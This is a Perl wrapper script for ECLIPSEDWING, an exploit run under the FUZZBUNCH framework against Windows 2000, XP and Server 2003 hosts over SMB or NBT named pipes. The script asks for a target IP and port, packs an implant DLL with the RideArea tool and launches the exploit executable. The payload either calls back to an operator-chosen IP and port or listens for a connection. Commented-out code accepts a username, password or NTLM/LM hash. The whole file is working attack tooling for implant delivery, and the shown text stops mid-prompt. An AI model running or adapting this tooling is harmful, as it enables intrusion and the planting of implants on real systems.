#
# Project:
#	ECLIPSEDWING
#
# File:
#	ECWI.pl
#
# Description:
#	This file is the FUZZBUNCH wrapper script for ECLIPSEDWING
#
# Modifications:
#


# ---------------------------------------------------------------
# Don't allow any unsafe constructs

use strict;
use vars qw($VERSION);

$::VERSION = "ECLIPSEDWING Script: 1.3.3.7";
print "\n\n$::VERSION\n\n";


# ---------------------------------------------------------------
# Useful packages

use FindBin;				# finds root directory of script
use lib "$FindBin::Bin";	# look for other modules in the bin directory containing this one
use Getopt::Long;			# long command line parsing
use Cwd;					# current directory

# Obtain utilities & globals from Exploit package
use lib "$FindBin::Bin\\..\\..\\Resources\\Perl";
use ExploitUtils qw(
	$EU_LOGFILE
	$EU_VERBOSE
	$EU_BATCHMODE
	EU_LogInit
	EU_Log
	EU_ExitMessage
	EU_GetInput
	EU_GetExistingDir
	EU_GetIP
	EU_GetLocalIP
	EU_GetRootDir
	EU_GetPort
	EU_RunCommand
	EU_GetAddr
);


# ---------------------------------------------------------------
# Globals
use vars qw($RIDEAREA $PAYLOAD_DLL $PAYLOAD_EXE $EXPLOIT_EXE @DEPFILES);
# ---------------------------------------------------------------
# Parse command line.
# Need to remove excess args or else EU_GetInput will break

my	%opts = ();
GetOptions(\%opts, "v", "h", "q|?", "b", "e=s", "f=s", "d=s", "t=s", "l=s", "c=s", "x=s", "n=s") or &print_script_usage(0);

if (scalar(@ARGV) > 0 ) {
  &EU_Log(1, "Extraneous arguments found on command line: @ARGV");
  &EU_Log(1, "Arguments will be ingnored");
  while(@ARGV) {shift;}
}

if (!defined($opts{"e"})) {
	&EU_Log(1, "A -e option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"f"})) {
	&EU_Log(1, "A -f option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"x"})) {
	&EU_Log(1, "A -x option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"l"})) {
	&EU_Log(1, "A -l option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"n"})) {
	&EU_Log(1, "A -n option must be supplied.");
	&print_usage(0);
}

# To Do: add any touch tools here
$::RIDEAREA		= "Resources\\Tools\\ridearea2.exe";	# relative address to RIDEAREA2.exe
$::RPCTOUCHII	= "Resources\\Tools\\rpc2.exe";		# used for RPCTOUCHII for probing Windows

$::LP_DLL	= "$opts{l}";					# -l ListeningPostDll
$::PAYLOAD_DLL	= "$opts{f}";				# dll payload
$::PAYLOAD_EXE	= "$opts{x}";				# exe payload
$::PAYLOAD_EXE_NAME = "$opts{n}";			# exe drop file name	
my $temp = $opts{e};
$::EXPLOIT_EXE	= "$temp\\ECWI.exe";		# relative address to executable
$::EXPLOIT_CFG  = "$temp\\ecwi.xml";     # our awesome trch config

# Egg socket use options
$::EGG_SOCKET_NONE			= "1";			# Deliver the exploit and implant payloads together
$::EGG_SOCKET_NEW			= "2";			# Egg will open a callback socket to upload Implant
$::EGG_SOCKET_REUSE			= "3";			# Exploit socket will be used to upload Implant

# Implant socket use options
$::IMPLANT_SOCKET_NEW		= "2";			# Egg will open a callback socket to upload Implant and for the follow on the operation 
$::IMPLANT_SOCKET_MAINTAIN	= "3";			# Exploit socket will be used to upload Implant and for the follow on the operation

# Run Options
# To Do: Add or remove RUN_PROBE_#s as needed
$::RUN_EXPLOIT				= "1";			# Launch the exploit 
$::RUN_PROBE_1				= "2";			# Launch Probe #1
$::RUN_PROBE_2				= "3";			# Launch Probe #2
$::RUN_PROBE_3				= "4";

# Exploit Versions
$::TARGET_VER_UNKNOWN	= -1;
$::TARGET_VER_2K		= 3;
$::TARGET_VER_XP		= 4;
$::TARGET_VER_2K3		= 5;

# OS Versions
$::OS_VER_UNKNOWN	= "UNKNOWN";
$::OS_VER_2K3		= "Windows Server 2003";
$::OS_VER_XP		= "Windows XP";
$::OS_VER_2K		= "Windows 2000";

# Payload Options
$::PAYLOAD_LISTEN = 0;
$::PAYLOAD_CALLBACK = 1;

#
# Global RPCTOUCHII run options
#	Copied from the  RPCTOUCHII_lib_interface.h file
#
my $RPCTOUCHII_RUN_GENERAL_PROBE			= 1;
my $RPCTOUCHII_RUN_REGPROBE					= 2;
my $RPCTOUCHII_RUN_XP_SP0_PROBE	            = 3; 
my $RPCTOUCHII_RUN_RPC_INTERFACE_PORT       = 4;
my $RPCTOUCHII_RUN_WINDOWS_2000_SP4_PROBE	= 5;
my $RPCTOUCHII_RUN_KB823980_PROBE           = 6; 
my $RPCTOUCHII_RUN_KB824146_PROBE			= 7; 
my $RPCTOUCHII_RUN_WINDOWS_2003_PROBE		= 8; 


my $work_dir       = $opts{"d"} if (defined $opts{"d"});
my $root_dir       = $opts{"c"} if (defined $opts{"c"});
my $TargetIpIn     = $opts{"t"} if (defined $opts{"t"});


# ---------------------------------------------------------------
# DEPFILES contains files that must exist beneath root directory
# To Do: add any touch tools here, too
#@DEPFILES = ($::RIDEAREA, $::EXPLOIT_EXE);
@DEPFILES = ($::RIDEAREA, $::EXPLOIT_EXE, $::RPCTOUCHII);		# Use this one if using RpcTouchII tool
# ---------------------------------------------------------------
# Generic information

#my	$work_dir	= "E:\\";					# default working directory
#my	$root_dir	= "$FindBin::Bin\\..\\..";	# one level up from dir containing script

my	$logfile_prefix		= "ECWI_";			# prefix to prepend to logfile name
my	$logfile_suffix		= "_script.log";	# suffix to append to logfile name
my	$filename_suffix	= "_payload.bin";	# suffix to append to payload file name

# Common command line arguments
my	$TargetIp			= $TargetIpIn;		# -i $TargetIp
my	$TargetPort			= 0;				# -p $TargetPort
my	$ImplantSocketStatus= $::IMPLANT_SOCKET_NEW;	# -c $ImplantSocketStatus
my	$TimeOutValue		= 0;				# -o $TimeOutValue

my	$PayloadFile		= "";				# Name of Payload File
my	$PayloadType		= "";				# DLL or EXE
my	$PayloadDropName	= "N/A";			# -n Payload drop filename	

my	$EggSocketStatus	= $::EGG_SOCKET_REUSE;	# -u $EggSocketStatus
my  $EggCallbackIp			= "127.0.0.1";		# -I $EggCallbackIp. 
my  $EggCallbackPort		= 0;				# -P $EggCallbackPort.

my	$ExternalRideArea	= 0;				#Call RideArea from the scrip external to the exploit library call
my	$RA_Payload			= "N/A";

my $TransProt_none		=0;
my $TransProt_tcp		=1;
my $TransProt_udp		=2;
my $TargetTransportProtocol	= $TransProt_none;		# Target Network Protocol 
my $TransportProtocol = "undefined";

my $Username = "NULL"; 
my $Password = "NULL";
my $NTHash = "00000000000000000000000000000000"; 
my $LMHash = "00000000000000000000000000000000";

my	$callbackFlag			=$::PAYLOAD_CALLBACK;
my	$EggCallInPort = 0;
my	$EggListenPort = 0;
my  $CallinTimeoutValue = 60;


# Global Application protocol contants cooresponds to the AppProtocolType enumerated type on _lib_interface.h file
my $AppProt_none	= 0;
my $AppProt_NA		= 1;
my $AppProt_nbt		= 2;
my $AppProt_smb		= 3;
my $AppProt_smtp	= 4;
my $AppProt_pop		= 5;
my $AppProt_http	= 6;
my $AppProt_ftp		= 7;
my $AppProt_telnet	= 8;
my $AppProt_imap	= 9;
my $TargetApplicationProtocol = $AppProt_none;				# Target Application Protocol 
my $ApplicationProtocol	= "undefined";	

my $RpcConnection =  "";									# RPC connection flag
															# "-rpc" if using an RPC connection
#
# Global OS versions
#
my $not			= "NOT GOOD";
my $w9x			= "Windows 9x";
my $nt4			= "Windows NT 4.0";
my $w2k			= "Windows 2000";
my $w2ksp0123	= "Windows 2000 Service Pack 0, 1, 2, or 3";
my $w2ksp4		= "Windows 2000 Service Pack 4";
my $wxp			= "Windows XP";
my $wxpsp0		= "Windows XP Service Pack 0";
my $wxpsp1		= "Windows XP Service Pack 1";
my $wxpsp2		= "Windows XP Service Pack 2";
my $wxpsp3      = "Windows XP Service Pack 3";
my $w2kXp		= "Windows 2000 XP" ;
my $wxp2003		= "Windows XP Server 2003" ;
my $ws2003		= "Windows Server 2003";
my $ws2003sp0	= "Windows Server 2003 Service Pack 0";
my $ws2003sp1	= "Windows Server 2003 Service Pack 1";
my $ws2003sp2   = "Windows Server 2003 Service Pack 2";



# Exploit specific command line arguments
# To Do: enter list of variables
my	$WindowsVersion		= 0;				# -w $WindowsVersion
my	$TargetServerIp		= "$TargetIpIn";	# -h $TargetServerIp



&print_usage(1) if (defined $opts{"h"});	# we're done if -h supplied
&print_usage(0) if (defined $opts{"q"});	# we're done if -? supplied

$ExploitUtils::EU_VERBOSE   = 1 if (defined $opts{"v"});	# turn on verbose mode
$ExploitUtils::EU_BATCHMODE = 1 if (defined $opts{"b"});	# turn on batch mode


# ---------------------------------------------------------------
# Ensure that we're on the right architecture
# ---------------------------------------------------------------

if ($ENV{"OS"} ne "Windows_NT") {
    &EU_ExitMessage(1,"This script requires Windows NT or Windows 2000");
}

# ---------------------------------------------------------------
# Obtain working directory
#
# We need this as early as possible so that we can begin doing logging.
# (Don't prompt the user if the option was supplied on the command line.)
# ---------------------------------------------------------------

$work_dir = &EU_GetExistingDir("Enter pathname for operation's working directory", $work_dir, 1);
$root_dir = &EU_GetRootDir($root_dir,@::DEPFILES);


# ---------------------------------------------------------------
# Set up log file
# ---------------------------------------------------------------

&EU_LogInit($logfile_prefix, $logfile_suffix, $work_dir);
&EU_Log(0,"$::VERSION");


# ---------------------------------------------------------------
# Change to Working Directory
# ---------------------------------------------------------------

&EU_Log(0,"\nChanging to working directory: $work_dir");
chdir $work_dir || &EU_ExitMessage(1,"Unable to change to working directory: $work_dir");


# ---------------------------------------------------------------
# Validate parameters.
# To Do: prompt the user for any and all necessary arguments
# within the validate_params() function
# ---------------------------------------------------------------

($TargetIp, $TargetPort, $EggSocketStatus, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName, $TimeOutValue,
 $TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection,
 $EggCallbackIp, $EggCallbackPort, $ExternalRideArea,
 $WindowsVersion, $TargetServerIp, $Username, $Password, $NTHash, $LMHash, $callbackFlag, $EggListenPort, $EggCallInPort, $CallinTimeoutValue) =
	&validate_parms($work_dir, $root_dir, $TargetIp, $TargetPort, $EggSocketStatus, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName,
	$TimeOutValue, $TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection, 
	$EggCallbackIp, $EggCallbackPort, $ExternalRideArea,
	$WindowsVersion, $TargetServerIp, $Username, $Password, $NTHash, $LMHash, $callbackFlag, $EggListenPort, $EggCallInPort, $CallinTimeoutValue);

# ---------------------------------------------------------------
# Map the version name for the OS/Service Pack combo to the 
# name used in the Truantchild XML.
# ---------------------------------------------------------------
if($WindowsVersion eq $wxpsp2){ $WindowsVersion = "XPSP2"; }
elsif($WindowsVersion eq $wxpsp3){ $WindowsVersion = "XPSP3"; }
#elsif($WindowsVersion eq $ws2003sp0){ $WindowsVersion = "W2K3SP0"; }
elsif($WindowsVersion eq $ws2003sp1){ $WindowsVersion = "W2K3SP1"; }
elsif($WindowsVersion eq $ws2003sp2){ $WindowsVersion = "W2K3SP2"; }
elsif($WindowsVersion eq $w2ksp4){ $WindowsVersion = "W2KSP4"; }

# ---------------------------------------------------------------
# Prompt user to launch executable
# ---------------------------------------------------------------
my $answer;
if(!$EU_BATCHMODE) {
	$answer = &EU_GetInput("\nReady to begin exploit ([y],n,quit)? ", "y");
	&EU_Log(0,"\nReady to begin exploit ([y],n,quit)? $answer");
	&EU_ExitMessage(0,"User terminated script")  if ($answer ne "y" and $answer ne "Y");
}


# ---------------------------------------------------------------
# Invoke RIDEAREA only if External RideArea flag has been set by the operator
# ---------------------------------------------------------------
if ($ExternalRideArea == 1) {

	# ---------------------------------------------------------------
	# Invoke RIDEAREA

	# Create Unique File Name for RideArea Payload
	my $payload_name_format = "${work_dir}\\${logfile_prefix}%04d%02d%02d_%02d%02d%02d${filename_suffix}"; 
	my ($sec, $min, $hour, $mday, $mon, $year, $wday, $yday, $isdst) = gmtime(time);

	$year += 1900;
	$mon  += 1;

	$RA_Payload = sprintf($payload_name_format,$year,$mon,$mday,$hour,$min,$sec);

	# Invoke RideArea

	# FunctionOrdinal == 17, FunctionArgument == 8, ThreadOption == Multi, LoadOption == Memory
	# Check to see if exe type payload.  i.e. valid PayloadDropName
	if ($PayloadDropName eq "N/A") {
		if ($PayloadType eq "d") {
			&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 17 -a 8 -t m -l m");
			&EU_Log(0, "\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 17 -a 8 -t m -l m");
		}
		else {
			&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 17 -a 8 -t m");
			&EU_Log(0, "\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 17 -a 8 -t m");
		}
	}
	else {
		if ($PayloadType eq "d") {
			&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 17 -a 8 -t m -l m");	
			&EU_Log(0, "\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 17 -a 8 -t m -l m");	
		}
		else {
			&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 17 -a 8 -t m");	
			&EU_Log(0, "\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 17 -a 8 -t m");	
		}
	}
}
###############################################################################
#
# The internal RideArea is not support for this exploit. If it has been
# previously selected, we bail here.
#
###############################################################################
else{
    print "Internal RideArea not supported for this op.";
    &EU_ExitMessage(0, "\nFailure to invoke with correct RideArea.");
}

# ---------------------------------------------------------------
# Invoke Exploit
# ---------------------------------------------------------------

my $flags;
if($ExploitUtils::EU_VERBOSE) { $flags = "-v"; }
else { $flags = ""; }

&EU_Log(1,"\nExploit will launch in a separate window. Follow the status messages");
&EU_Log(1,"in the new window to determine if it succeeds.");
&EU_Log(1,"\nLaunching exploit...");


my $ImplantPayload = "N/A";
if ($ExternalRideArea == 1) {
	$ImplantPayload = $RA_Payload;
}
#else {
#	$ImplantPayload = $PayloadFile;
#}

if ($ExternalRideArea == 1) {
#	&EU_RunCommand("start \"ECWI Exploit\" cmd /T:9F /K \"\"$root_dir\\$::EXPLOIT_EXE\" -r $::RUN_EXPLOIT	-i $TargetIp 
#                                                                                                            -p $TargetPort 
#                                                                                                            -u $EggSocketStatus 
#                                                                                                            -c $ImplantSocketStatus 
#                                                                                                            -I $EggCallbackIp
#                                                                                                            -P $EggCallbackPort
#                                                                                                            -f \"$ImplantPayload\" 
#                                                                                                            -l \"$root_dir\\$::LP_DLL\" 
#                                                                                                            -z 
#                                                                                                            -o $TimeOutValue 
#                                                                                                            -t $TargetTransportProtocol 
#                                                                                                            -b $TargetApplicationProtocol $RpcConnection 
#                                                                                                            -w $WindowsVersion 
#                                                                                                            -h $TargetServerIp 
#                                                                                                            -U $Username 
#                                                                                                            -W $Password 
#                                                                                                            -N $NTHash 
#                                                                                                            -L $LMHash\"");

    my $TrchConfig = $root_dir."\\".$::EXPLOIT_CFG;

    if( $callbackFlag eq $::PAYLOAD_LISTEN) {
        &EU_RunCommand("start \"ECWI\" cmd /T:9F /K \"\"$root_dir\\$::EXPLOIT_EXE\" --InConfig \"$TrchConfig\" --TargetIp $TargetIp --TargetPort $TargetPort --Protocol $ApplicationProtocol --Payload Listener --ListenPort $EggListenPort --CallinPort $EggCallInPort --CallinTimeout $CallinTimeoutValue --Target $WindowsVersion --RunMode Standalone --RideArea $RA_Payload --LPFileName \"$root_dir\\$::LP_DLL\"\"");
    }
    else {
        &EU_RunCommand("start \"ECWI\" cmd /T:9F /K \"\"$root_dir\\$::EXPLOIT_EXE\" --InConfig \"$TrchConfig\" --TargetIp $TargetIp --TargetPort $TargetPort --Protocol $ApplicationProtocol --Payload Callback --CallbackIp $EggCallbackIp --CallbackPort $EggCallbackPort --Target $WindowsVersion --RunMode Standalone --RideArea $RA_Payload --LPFileName \"$root_dir\\$::LP_DLL\"\"");
    }

#else {
#	if ($PayloadDropName eq "N/A") {
#		&EU_RunCommand("start \"ECWI Exploit\" cmd /T:9F /K \"\"$root_dir\\$::EXPLOIT_EXE\" -r $::RUN_EXPLOIT	-i $TargetIp -p $TargetPort -u $EggSocketStatus -c $ImplantSocketStatus -I $EggCallbackIp -P $EggCallbackPort	-f \"$ImplantPayload\" -x $PayloadType -l \"$root_dir\\$::LP_DLL\" -o $TimeOutValue -t $TargetTransportProtocol -b $TargetApplicationProtocol $RpcConnection -w $WindowsVersion -h $TargetServerIp -U $Username -W $Password -N $NTHash -L $LMHash\"");
#	}
#	else {
#		&EU_RunCommand("start \"ECWI Exploit\" cmd /T:9F /K \"\"$root_dir\\$::EXPLOIT_EXE\" -r $::RUN_EXPLOIT	-i $TargetIp -p $TargetPort -u $EggSocketStatus -c $ImplantSocketStatus -I $EggCallbackIp -P $EggCallbackPort	-f \"$ImplantPayload\" -x $PayloadType -q $PayloadDropName -l \"$root_dir\\$::LP_DLL\" -o $TimeOutValue -t $TargetTransportProtocol -b $TargetApplicationProtocol $RpcConnection -w $WindowsVersion -h $TargetServerIp -U $Username -W $Password -N $NTHash -L $LMHash\"");
#	}
}


# ---------------------------------------------------------------
# Done.
# ---------------------------------------------------------------

my $cur_dir = cwd();
chdir $cur_dir || &EU_ExitMessage(1,"Unable to switch back to initial directory: $cur_dir");

&EU_ExitMessage(0,"\nDone with $::0.");


##############################################################################
#
#                P R I N T _ U S A G E
#
# Output usage information and exit.
#
# Parameters:
#	$_[0] = full help flag, i.e. if non-zero then display complete usage

# print usage message 
sub print_usage() {
	my ($verbose) = @_;
	print "$::VERSION\n";

	print qq~
Usage: $::0 [-v] [-h] [-?] [-b]
             [-d <working directory>] [-e <exploits directory>]
			 [-t <target IP>] [-l <lp dll>]
             [-f <payload dll>] 
			 [-x <payload exe> [-n <Payload Dropname>]]
	 
~;

	if ($verbose) {
		print qq~

  -v                    verbose mode. Default non-verbose mode.

  -h                    Print this help information.

  -?                    Print abbreviated help information.

  -b                    Batch (non-interactive) mode. Default interactive mode.

  -d <working directory> Working Directory
                        Top-level directory where operation's files will be
                        generated. Default E:\.

  -e <exploits directory> Exploits Directory
                        Top-level directory containing exploit files.
						Default one directory up from directory containing this script.

  -t <target IP>        Target IP address.
                        Default derived as last part of working directory name.
  
  -l <lp dll>           Filename of the listening post dll.

  -f <payload dll>      Filename of the implant payload (dll).

  -x <payload exe>      Filename of the implant payload (exe).

  -n <payload dropname> Filename to be used for the dropped executable 

~;
	}

	&EU_ExitMessage(1,"End of help.");
}


##############################################################################
#
#			V A L I D A T E _ P A R M S
#
# *** NOTE: this routine is exploit specific
#
# Parameters:
#	$_[0] = $work_dir
#	$_[1] = $root_dir
#	$_[2] = $TargetIp
#	$_[3] = $TargetPort
#	$_[4] = $EggSocketStatus
#	$_[5] = $ImplantSocketStatus
#	$_[6] = $PayloadFile
#	$_[7] = $PayloadType
#	$_[8] = $PayloadDropName
#	$_[9] = $TimeOutValue
#	$_[A] = $TargetTransportProtocol
#	$_[B] = $TargetApplicationProtocol
#	$_[C] = $RpcConnection
#	$_[D] = $EggCallbackIp
#	$_[E] = $EggCallbackPort
#	$_[F] = $ExternalRideArea
#	$_[10] = $WindowsVersion
#	$_[11] = $TargetServerIp
#	$_[12] = $Username
#	$_[13] = $Password
#	$_[14] = $NTHash
#	$_[15] = $LMHash
#	$_[16] = $callbackFlag
#	$_[17] = $EggListenPort
#	$_[18] = $EggCallInPort
# To Do: Add exploit specific params to the list
#
# Returns:
#	array of values to replace supplied input parameters
#	*** Note: may exit via call to &EU_GetInput or batch mode failure.
#
# Globals:
#	$ExploitUtils::EU_LOGFILE
#	$ExploitUtils::EU_BATCHMODE
#	$ExploitUtils::EU_VERBOSE
#
# Program will attempt to obtain appropriate values for each of the
# specified input parameters (other than $work_dir).
#
sub validate_parms()
{

	my ($work_dir, $root_dir, $TargetIp, $TargetPort, $EggSocketStatus, $ImplantSocketStatus, 
		$PayloadFile, $PayloadType, $PayloadDropName,
		$TimeOutValue,$TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection,
		$EggCallbackIp, $EggCallbackPort, $ExternalRideArea,
		$WindowsVersion, $TargetServerIp, $Username, $Password, $NTHash, $LMHash, $callbackFlag, $EggCallInPort, $CallinTimeoutValue, $Call) = @_;

	# Common local variables
	my ($continue, $retcode, $vol, $dir);
	my ($redirectFlag);
	my $OrgTargetIp					= $TargetIp;
	my $LPRedirectionIp				= "127.0.0.1";
	my $LPRedirectionPort			= "undefined";
	my $DestinationIp				= $TargetIp;
	my $DestinationPort				= "undefined";
	my $TransportProtocolSelected	= 0;
	my $RideAreaOpt					= "Exploit called";
	my $UsingPassword				= 0;
	my ($LocalIp);
	my $RpcTouchProtocol			= "undefined";
	my $touch						= $::RUN_PROBE_1;
	my $bVulnerable = 0;
	my $bError = 0;


	# Get the Local IP Address
	$LocalIp = &EU_GetLocalIP("Enter the local IP Address", $LocalIp);
	&EU_Log(0, "Enter the local IP Address:  $LocalIp");
	while (1) 
	{

		# To Do: prompt user for add any additional arguments as necessary

		# ---------------------------------------------------------------
		# Acquire Implant Type
		# ---------------------------------------------------------------

		&EU_Log(1,"\nSelect Payload file to send:\n");
		&EU_Log(1,"   0) $::PAYLOAD_DLL");		
        # EXE payloads not supported.
		#&EU_Log(1,"   1) $::PAYLOAD_EXE ($::PAYLOAD_EXE_NAME) (not supported)");		
		while(1) 
		{
			$retcode = &EU_GetInput("\nEnter selection [0]: ", "0");
			&EU_Log(0, "\nEnter selection [0]: $retcode");

			if($retcode eq "0") 
			{
				&EU_Log(1,"\nUsing Payload file $::PAYLOAD_DLL\n");
				$PayloadFile = $::PAYLOAD_DLL;
				$PayloadType = "d";
				$PayloadDropName = "N/A";
			}
            # EXE payloads not supported.
			#elsif($retcode eq "1") 
			#{ 
			#	&EU_Log(1,"\nUsing Payload file $::PAYLOAD_EXE\n");
			#	$PayloadFile = $::PAYLOAD_EXE;
			#	$PayloadType = "e";
			#	$PayloadDropName = $::PAYLOAD_EXE_NAME;
			#}
			else 
			{
				&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
				next;
			}
			last;
		} # while(1) payload selection


		# ---------------------------------------------------------------
		# Acquire RideArea option
		# ---------------------------------------------------------------

		&EU_Log(1,"\nRideArea option:\n");
		&EU_Log(1,"     Script will call external RideArea - Must have DEP support");
		$RideAreaOpt = "Script called";
		$ExternalRideArea = 1;
		
		# ---------------------------------------------------------------
		# Get Network Target Network Protocol
		# ---------------------------------------------------------------

		&EU_Log(1,"\nSelect the Transport Protocol Sequence To Use:\n");
		&EU_Log(1,"   1) NBT/Named Pipe (TCP Port 139 is accessible)");
		&EU_Log(1,"   2) SMB/Named Pipe (TCP Port 445 is accessible)");
		#&EU_Log(1,"   3) TCP/IP Ephemeral Port (Ephemeral TCP Port is accessible)");
		#&EU_Log(1,"   4) UDP/IP (UDP Port 135 is accessible)");
		

		while(1)
		 {
			$TransportProtocolSelected = &EU_GetInput("\nEnter selection [2]: ", "2");
			&EU_Log(0, "\nEnter selection [2]: $TransportProtocolSelected");
			if ($TransportProtocolSelected eq "1") 
			{
				$TargetTransportProtocol	= $TransProt_tcp;
				$TransportProtocol			= "tcp";
				$TargetApplicationProtocol	= $AppProt_nbt;
				$ApplicationProtocol		= "nbt";
				$RpcConnection				= "-rpc";
				$RpcTouchProtocol			= "rpc_nbt";
				$DestinationPort			= 139;
			}
			elsif($TransportProtocolSelected eq "2") {
				$TargetTransportProtocol	= $TransProt_tcp;
				$TransportProtocol			= "tcp";
				$TargetApplicationProtocol	= $AppProt_smb;
				$ApplicationProtocol		= "smb";
				$RpcConnection				= "-rpc";
				$RpcTouchProtocol			= "rpc_smb";
				$DestinationPort			= 445;
			}
#			elsif($TransportProtocolSelected eq "3") {
#				$TargetTransportProtocol	= $TransProt_tcp;
#				$TransportProtocol			= "tcp";
#				$TargetApplicationProtocol	= $AppProt_NA;
#				$ApplicationProtocol		= "NA";
#				$RpcConnection				= "-rpc";
#				$RpcTouchProtocol			= "rpc_tcp";
#				$DestinationPort			= 135;
#				$touch						= $::RUN_PROBE_2;
#			}
#			elsif($TransportProtocolSelected eq "4") {
#				$TargetTransportProtocol	= $TransProt_udp;
#				$TransportProtocol			= "udp";
#				$TargetApplicationProtocol	= $AppProt_NA;
#				$ApplicationProtocol		= "NA";
#				$RpcConnection				= "-rpc";
#				$RpcTouchProtocol			= "rpc_udp";
#				$DestinationPort			= 135;
#			}
			else {
				&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
				next;
				}
			last;
		}  ### while(1) Network Target Network Protocol selection

		# ---------------------------------------------------------------
		# Acquire  Username/Password option
		# ---------------------------------------------------------------

#		&EU_Log(1,"\nUsername/Password option:\n");
#		&EU_Log(1,"   0) Use anonymous access (No username or password)[DEFAULT]");		
#		&EU_Log(1,"   1) Supply a username and password (Only needed if anon. access is denied)");
#		&EU_Log(1,"   2) Supply a username and NTLM and LANMAN password hash (Only needed if anon. access is denied)");
#				
#		while(1) 
#		{
#			$UsingPassword = &EU_GetInput("\nEnter selection [$UsingPassword]: ", $UsingPassword);
#			&EU_Log(0, "\nEnter selection [$UsingPassword]: $UsingPassword");
#   
#			if($UsingPassword eq  "0")
#			{
#				; # Nothing to do
#			}
#			elsif($UsingPassword eq  "1")
#			{ 
#				$Username = &EU_GetInput("\nEnter Username[$Username]: ", $Username);
#				&EU_Log(0, "\nEnter Username[NULL]: $Username");
#				$Password = &EU_GetInput("\nEnter Password [$Password]: ", $Password);
#				&EU_Log(0, "\nEnter Password [NULL]: $Password");
#			}
#			elsif($UsingPassword eq  "2")
#			{ 
#				$Username = &EU_GetInput("\nEnter Username[$Username]: ", $Username);
#				&EU_Log(0, "\nEnter Username[NULL]: $Username");
#
#				$NTHash = &EU_GetInput("\nEnter NTLM password hash [$NTHash]: ", $NTHash);
#				&EU_Log(0, "\nEnter NTLM password hash [$NTHash]:  $NTHash");
#
#				$LMHash = &EU_GetInput("\nEnter LANMAN password hash [$LMHash]: ", $LMHash);
#				&EU_Log(0, "\nEnter LANMAN password hash [$LMHash]:  $LMHash");
#
#				##In order for the TIPPYBELCH library to work properly we must set a fake password.
#				$Password = "FakePassword";
#			}
#			else 
#			{
#				&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
#				next;
#			}
#			last;
#		} # while(1) payload selection


		# ---------------------------------------------------------------
		# Prompt for REDIRECTION
		# ---------------------------------------------------------------
		$retcode = &EU_GetInput("\nWill this operation be REDIRECTED ([y],n)? ", "y");
		&EU_Log(0, "\nWill this operation be REDIRECTED ([y],n)? $retcode");


		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") ) 
		{ 
			$redirectFlag = 1; 
		}
		else 
		{ 
			$redirectFlag = 0; 
		}


		# ---------------------------------------------------------------
		# REDIRECTION FALSE
		# ---------------------------------------------------------------

		if( $redirectFlag == 0 ) 
		{

			# ---------------------------------------------------------------
			# Get Target IP Address and Port (to which to deliver the exploit)
			# Use Actual Target's IP Address
			# ---------------------------------------------------------------
			$EggCallbackIp = $LocalIp;
			$TargetIp = $OrgTargetIp;  #if loop back after setting redirection, TargetIp needs to be reset
			$TargetIp = &EU_GetIP("\nEnter the target IP Address", $TargetIp);
			&EU_Log(0, "Enter the target IP Address:  $TargetIp");
			$DestinationIp = $TargetIp;


			$DestinationPort = &EU_GetPort("\nEnter the target Port", $DestinationPort);
			&EU_Log(0, "Enter the target Port:  $DestinationPort");

			$TargetPort = $DestinationPort;
			$TargetServerIp = $TargetIp;

			# ---------------------------------------------------------------
			# Get Payload Type
			# ---------------------------------------------------------------

			$callbackFlag = &get_payload_type($callbackFlag);

			# ---------------------------------------------------------------
			# LISTEN PAYLOAD
			# ---------------------------------------------------------------

			if( $callbackFlag eq $::PAYLOAD_LISTEN) 
			{
				($ImplantSocketStatus, $EggSocketStatus) = &get_socket_options($ImplantSocketStatus, $EggSocketStatus, 
																			   $PayloadType);
				# Prompt for Egg Listen Port
				while(1) 
				{
					$EggListenPort = &EU_GetPort("\nEnter the Listen Port", $EggListenPort);
					&EU_Log(0, "Enter the Egg listen Port:  $EggListenPort");
				
					if($EggListenPort eq "0") 
					{
						&EU_Log(1, "Invalid Port number. Try again or enter 'quit'.");
					next;
					}
					last;
				} # while(1) payload selection

				# Prompt for Egg Call In Port
				while(1) 
				{
					$EggCallInPort = &EU_GetPort("\nEnter the Call In Port", $EggCallInPort);
					&EU_Log(0, "Enter the Egg call In Port:  $EggCallInPort");
				
					if($EggCallInPort eq "0") 
					{
						&EU_Log(1, "Invalid Port number. Try again or enter 'quit'.");
					next;
					}
					last;
				} # while(1) payload selection
				
        		# ---------------------------------------------------------------
        		# Prompt for socket time-out value
        		# ---------------------------------------------------------------

        		&EU_Log(1, "\nThe default time-out value before the CALL IN connection is made is 60 sec.");
        		&EU_Log(1, "(You may want to increase this value if the network is exceptionally slow.)");
        		$retcode = &EU_GetInput("Use default value of 60 sec ([y],n)? ", "y");
        		&EU_Log(0, "Use default value of 60 sec ([y],n)?  $retcode");

        		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") or ($retcode eq "60") ) {
        			$CallinTimeoutValue = "60";
        		}
        		else {
        			$CallinTimeoutValue = &EU_GetInput("Enter new time-out value (greater than 60): ");
